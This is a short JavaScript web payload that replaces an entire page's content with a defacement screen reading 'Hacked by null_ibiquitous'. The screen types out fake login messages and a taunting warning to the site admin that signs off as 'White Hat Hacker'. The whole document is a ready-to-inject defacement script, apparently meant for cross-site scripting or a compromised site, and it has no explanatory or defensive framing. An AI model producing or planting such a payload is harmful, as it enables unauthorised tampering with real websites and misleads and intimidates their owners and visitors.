document.documentElement.innerHTML=`<!DOCTYPE HTML>
<html>

<head>
    <title>Hacked by null_ibiquitous</title>
</head>

<body
    style="background:url(https://media.giphy.com/media/WH0wtLBfnmIvK/source.gif); background-repeat: no-repeat;background-size: 100% 300%;">
    <center>
        <form id="msgForAdmin">
            <textarea style="background-color:#000000; color:#32CD32; resize:none;" name="about" readonly="readonly" rows="9" cols="60" wrap="soft">
			</textarea>
        </form>
        <div style="width: 600px;height: 120px;">
    </center>
</body>
<script type="text/javascript">
    var msg = new Array(
        "Username :  null_ibiquitous",
        "Password : *****************",
        "Logging in.....",
        "Logged in as :  null_ibiquitous",
        "Accessing website....",
        "Critical Error : Website is hacked by null_ibiquitous",
        "@Admin : Repair your vulnerabilities. This is just a warning.",
        "We are White Hat Hacker. Expect US.",
        "<----------------------------------------------------------->"
    );
    var speed = 60;
    var index = 0; text_pos = 0;
    var str_length = msg[0].length;
    var contents, row;
   function type_text() {
        contents = '';
        row = Math.max(0, index - 20);
        while (row < index)
            contents += msg[row++] + '\r\n';
        var elementObj = document.getElementById("msgForAdmin");
        elementObj.elements[0].value = contents + msg[index].substring(0, text_pos) + "";
        if (text_pos++ == str_length) {
            text_pos = 0;
            index++;
            if (index != msg.length) {
                str_length = msg[index].length;
                setTimeout("type_text()", 1500);
            }
        }
        else
            setTimeout("type_text()", speed);
    };
    window.onload=type_text();
    
</script>


</html>`